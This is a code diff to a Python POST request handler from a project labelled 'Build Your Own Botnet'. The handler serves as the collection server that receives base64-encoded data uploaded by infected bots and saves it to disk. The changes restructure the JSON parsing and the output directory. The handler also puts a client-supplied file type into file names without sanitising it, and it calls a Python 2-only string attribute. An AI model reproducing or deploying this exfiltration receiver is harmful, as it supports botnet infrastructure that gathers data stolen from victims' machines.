@@ -1,7 +1,8 @@
 #!/usr/bin/python
-'Post Request Handler (Build Your Own Botnet)'
+'POST Request Handler (Build Your Own Botnet)'
 
 # standard library
+import os
 import sys
 import json
 import string
@@ -11,7 +12,7 @@ if sys.version_info[0] < 3:
 	from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
 else:
 	from http.server import BaseHTTPRequestHandler, HTTPServer
-	
+
 
 class Handler(BaseHTTPRequestHandler):
 	"""
@@ -33,11 +34,22 @@ class Handler(BaseHTTPRequestHandler):
 		self.data_string = self.rfile.read(int(self.headers['Content-Length']))
 		self.send_response(200)
 		self.end_headers()
-		data = json.loads(self.data_string)
-		ftype = data.keys()[0]
-		fname = 'data/{}.{}'.format(str().join([random.choice(string.lowercase + string.digits) for _ in range(3)]), ftype)
-		data = base64.b64decode(data.get(ftype))
-		with open(fname, 'wb') as fp:
+
+		json_data = json.loads(self.data_string)
+
+		b64_data = json_data.get('data')
+		ftype = json_data.get('type')
+
+		data = base64.b64decode(b64_data)
+
+		output_dir = 'output'
+		if not os.path.isdir(output_dir):
+			os.makedirs(output_dir)
+
+		fname = str().join([random.choice(string.lowercase + string.digits) for _ in range(3)]) + '.' + ftype
+		output_path = os.path.join(output_dir, fname)
+
+		with open(output_path, 'wb') as fp:
 			fp.write(data)
 
 
@@ -47,7 +59,6 @@ def run(server_class=HTTPServer, handler_class=Handler, port=80):
 
 def main():
 	port = int(sys.argv[1])
-	print("port: {}".format(port))
 	run(port=port)
 
 if __name__ == '__main__':
